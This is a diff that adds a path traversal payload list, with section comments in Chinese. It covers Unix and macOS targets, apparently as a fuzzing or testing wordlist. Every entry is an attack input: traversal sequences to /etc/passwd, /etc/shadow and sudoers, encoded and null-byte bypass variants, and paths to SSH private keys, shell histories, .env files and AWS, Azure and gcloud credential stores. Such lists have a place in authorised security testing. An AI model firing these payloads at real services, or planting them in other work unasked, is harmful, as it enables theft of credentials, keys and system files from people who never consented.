@@ -1,0 +1,68 @@
+# Path Traversal Attack Payloads
+# ================================
+# 覆盖：Unix/Linux/macOS 环境
+# 目标文件：/etc/passwd, /etc/shadow, ~/.ssh/id_rsa, ~/.aws/credentials, .env
+
+# === 经典路径穿越 ===
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+# === 绝对路径 ===
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/etc/sudoers
+/root/.bash_history
+/root/.ssh/id_rsa
+
+# === macOS 特定 ===
+/Users/user/.ssh/id_rsa
+/Users/user/.ssh/id_ed25519
+/Users/user/.aws/credentials
+/Users/user/.gitconfig
+/Users/user/.bash_history
+/Users/user/.zsh_history
+/private/etc/passwd
+
+# === URL 编码变体 ===
+..%2fetc%2fpasswd
+..%2F..%2Fetc%2Fpasswd
+%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/etc/passwd
+..%252fetc%252fpasswd
+
+# === Unicode/UTF-8 编码 ===
+..%c0%afafetc/passwd
+..%ef%bc%8fetc/passwd
+%uff0e%uff0e/etc/passwd
+
+# === 双斜杠/混合 ===
+....//....//etc/passwd
+..\/etc\/passwd
+..\/..\/ (Windows 风格，某些跨平台库接受)
+
+# === 空字节截断（老版 PHP/C）===
+../etc/passwd%00
+../../../etc/passwd%00.jpg
+
+# === 敏感 dot files ===
+.env
+../.env
+../../.env
+~/.env
+.git/config
+../.git/config
+.ssh/id_rsa
+../.ssh/id_rsa
+
+# === 云凭证路径 ===
+~/.aws/credentials
+~/.aws/config
+~/.azure/accessTokens.json
+~/.config/gcloud/credentials.db
